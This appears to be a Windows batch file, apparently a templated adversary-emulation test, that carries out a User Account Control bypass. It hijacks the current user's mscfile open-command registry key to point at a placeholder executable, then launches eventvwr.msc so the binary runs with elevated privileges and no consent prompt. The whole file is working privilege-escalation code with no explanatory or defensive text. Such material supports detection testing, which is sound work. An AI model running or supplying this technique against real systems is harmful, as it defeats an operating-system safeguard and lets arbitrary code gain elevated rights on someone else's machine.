@echo off
reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d "#{executable_binary}" /f
cmd.exe /c eventvwr.msc
